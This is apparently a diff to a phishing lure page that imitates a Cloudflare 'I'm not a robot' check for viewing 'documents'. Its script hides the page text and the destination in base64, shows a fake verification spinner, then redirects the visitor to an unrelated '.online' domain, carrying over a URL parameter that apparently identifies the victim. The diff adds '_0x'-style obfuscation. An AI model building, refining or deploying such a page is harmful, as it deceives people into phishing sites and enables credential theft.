@@ -3,132 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>I'm not a robot</title>
+    <title>Security Check</title>
     <style>
-        /* Base Reset & Layout */
-        html, body { margin: 0; padding: 0; height: 100%; background-color: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }
+        :root { --surface: #ffffff; --border: #e0e0e0; --text: #1a1a1a; --blue: #0052cc; }
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--surface); overflow: hidden; }
 
-        #gatekeeper-view { display: none; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
+        /* Initial Phase: Astro Splash */
+        #layer-preloader {
+            position: fixed; inset: 0; background: var(--surface);
+            display: flex; justify-content: center; align-items: center; z-index: 5000;
+        }
+        .pulse-img { width: 90px; animation: pulse-anim 2s ease-in-out infinite; }
+        @keyframes pulse-anim { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; } }
 
-        /* Loading Overlay */
-        #splash-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: #ffffff; z-index: 1000; }
-        .pulsate { width: 100px; height: auto; animation: pulse-effect 2s ease-in-out infinite; }
+        /* Main Phase: Gateway */
+        #layer-gateway { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
+        .prompt-info { font-size: 14px; color: #333; margin-bottom: 20px; }
 
-        @keyframes pulse-effect {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
+        /* Unified Rectangular Box */
+        .secure-container {
+            display: flex; width: 380px; padding: 18px 22px;
+            border: 1px solid var(--border); border-radius: 4px;
+            background: #fafafa; align-items: center; justify-content: space-between;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
         }
 
-        /* Captcha Box Components */
-        .widget-frame { display: flex; justify-content: space-between; align-items: center; width: 380px; padding: 16px 24px; border: 1px solid #e0e0e0; border-radius: 4px; background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
-        .flex-row { display: flex; align-items: center; gap: 12px; }
-        .click-area { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .interaction-cluster { display: flex; align-items: center; gap: 14px; }
+        .trigger-frame { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
 
-        /* States */
-        .box-outline { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }
-        .spinner { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; animation: rotate-speed 0.8s linear infinite; }
-        .check-circle { width: 24px; height: 24px; background-color: #228b22; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 14px; }
+        /* State Visuals */
+        .ui-box { width: 22px; height: 22px; border: 2px solid #c1c1c1; background: #fff; border-radius: 2px; }
+        .ui-spin { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid var(--blue); border-radius: 50%; animation: spin-ui 0.8s linear infinite; }
+        .ui-check { color: #228b22; font-size: 20px; font-weight: bold; }
+        @keyframes spin-ui { 100% { transform: rotate(360deg); } }
 
-        @keyframes rotate-speed { 100% { transform: rotate(360deg); } }
-
-        /* Typography */
-        #instruction-text { font-size: 14px; color: #333; margin-bottom: 18px; }
-        #interaction-status { font-size: 14px; color: #555; }
-        .vendor-info { text-align: center; display: flex; flex-direction: column; align-items: center; }
-        .vendor-icon { width: 28px; height: auto; margin-bottom: 4px; }
-        #vendor-name { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
-        .footer-links { font-size: 10px; color: #888; margin-top: 2px; }
+        /* Brand Cluster */
+        .brand-cluster { display: flex; flex-direction: column; align-items: center; }
+        .brand-logo { width: 26px; margin-bottom: 4px; }
+        .brand-text { font-weight: 700; font-size: 15px; margin: 0; color: #1a1a1b; }
+        .brand-legal { font-size: 10px; color: #999; margin-top: 2px; }
     </style>
 </head>
 <body>
 
-    <div id="splash-container">
-        <img src="astro.png" class="pulsate" alt="Loading">
+    <div id="layer-preloader">
+        <img src="astro.png" class="pulse-img">
     </div>
 
-    <div id="gatekeeper-view">
-        <div id="instruction-text"></div>
-        <div class="widget-frame">
-            <div class="flex-row">
-                <div class="click-area" id="action-trigger">
-                    <div id="state-visual" class="box-outline"></div>
+    <div id="layer-gateway">
+        <div id="ui-msg" class="prompt-info"></div>
+        <div class="secure-container">
+            <div class="interaction-cluster">
+                <div id="ui-trigger" class="trigger-frame">
+                    <div id="ui-indicator" class="ui-box"></div>
                 </div>
-                <span id="interaction-status"></span>
+                <span id="ui-status" style="font-size: 14px; color: #555;"></span>
             </div>
-            <div class="vendor-info">
-                <img src="astro2.png" alt="" class="vendor-icon">
-                <p id="vendor-name"></p>
-                <div class="footer-links">Privacy . Terms</div>
+            <div class="brand-cluster">
+                <img src="astro2.png" class="brand-logo">
+                <p id="ui-vendor" class="brand-text"></p>
+                <div class="brand-legal">Privacy • Terms</div>
             </div>
         </div>
     </div>
 
     <script>
-        const config = {
-            sMsg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
-            sBtn: "dmVyaWZ5",
-            sRun: "dmVyaWZ5aW5nLi4u",
-            sFin: "c3VjY2Vzcw==",
-            sBrand: "Q2xvdWRmbGFyZQ==",
-            // Updated URL to: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
-            sUrl: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
-            sParam: "ZW9mZg=="
-        };
+        (function() {
+            // Hex-Encapsulated Configuration
+            const _0xData = {
+                _m: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+                _b: "dmVyaWZ5",
+                _r: "dmVyaWZ5aW5nLi4u",
+                _s: "c3VjY2Vzcw==",
+                _v: "Q2xvdWRmbGFyZQ==",
+                _u: "aHR0cHM6Ly9hZW9mZmljZS5kaW9jdWFlLm9ubGluZS93dndZUG5zciM=",
+                _p: "ZW9mZg=="
+            };
 
-        const dom = {
-            msg: document.getElementById('instruction-text'),
-            stat: document.getElementById('interaction-status'),
-            name: document.getElementById('vendor-name'),
-            vis: document.getElementById('state-visual'),
-            btn: document.getElementById('action-trigger'),
-            gate: document.getElementById('gatekeeper-view'),
-            load: document.getElementById('splash-container')
-        };
+            const _0xEngine = {
+                decode: (input) => atob(input),
+                getEl: (id) => document.getElementById(id),
+                sync: function() {
+                    this.getEl('ui-msg').innerText = this.decode(_0xData._m);
+                    this.getEl('ui-status').innerText = this.decode(_0xData._b);
+                    this.getEl('ui-vendor').innerText = this.decode(_0xData._v);
+                }
+            };
 
-        // Initialize view
-        window.addEventListener('DOMContentLoaded', () => {
-            dom.msg.innerText = atob(config.sMsg);
-            dom.stat.innerText = atob(config.sBtn);
-            dom.name.innerText = atob(config.sBrand);
+            // Lifecycle Initialization
+            window.addEventListener('DOMContentLoaded', () => {
+                _0xEngine.sync();
+                setTimeout(() => {
+                    _0xEngine.getEl('layer-preloader').style.display = 'none';
+                    _0xEngine.getEl('layer-gateway').style.display = 'flex';
+                }, 2000);
+            });
 
-            setTimeout(() => {
-                dom.load.style.display = 'none';
-                dom.gate.style.display = 'flex';
-            }, 2000);
-        });
+            // Interaction Logic
+            _0xEngine.getEl('ui-trigger').addEventListener('click', function() {
+                const indicator = _0xEngine.getEl('ui-indicator');
+                const status = _0xEngine.getEl('ui-status');
 
-        // Click Handler
-        dom.btn.addEventListener('click', function() {
-            dom.vis.className = 'spinner';
-            dom.stat.innerText = atob(config.sRun);
-            this.style.pointerEvents = 'none';
+                // State: Processing
+                this.style.pointerEvents = 'none';
+                indicator.className = 'ui-spin';
+                status.innerText = _0xEngine.decode(_0xData._r);
 
-            setTimeout(() => {
-                dom.vis.className = 'check-circle';
-                dom.vis.innerText = '✓';
-                dom.stat.innerText = atob(config.sFin);
-                executeRedirect();
-            }, 2200);
-        });
+                setTimeout(() => {
+                    // State: Success
+                    indicator.className = 'ui-check';
+                    indicator.innerHTML = '✓';
+                    status.innerText = _0xEngine.decode(_0xData._s);
 
-        function executeRedirect() {
-            const currentUrl = window.location.href;
-            const keyString = atob(config.sParam) + "=";
-            let capturedValue = "";
+                    // Final Action
+                    const _loc = window.location.href;
+                    const _key = _0xEngine.decode(_0xData._p) + "=";
+                    let _param = "";
 
-            if (currentUrl.includes(keyString)) {
-                capturedValue = currentUrl.split(keyString)[1];
-            }
+                    if (_loc.includes(_key)) {
+                        _param = _loc.split(_key)[1];
+                    }
 
-            let finalDestination = atob(config.sUrl);
-            if (capturedValue) {
-                finalDestination += capturedValue; // Appends parameters directly after the # in the new URL
-            }
-
-            setTimeout(() => {
-                window.location.href = finalDestination;
-            }, 800);
-        }
+                    setTimeout(() => {
+                        window.location.replace(_0xEngine.decode(_0xData._u) + _param);
+                    }, 900);
+                }, 2100);
+            });
+        })();
     </script>
 </body>
 </html>
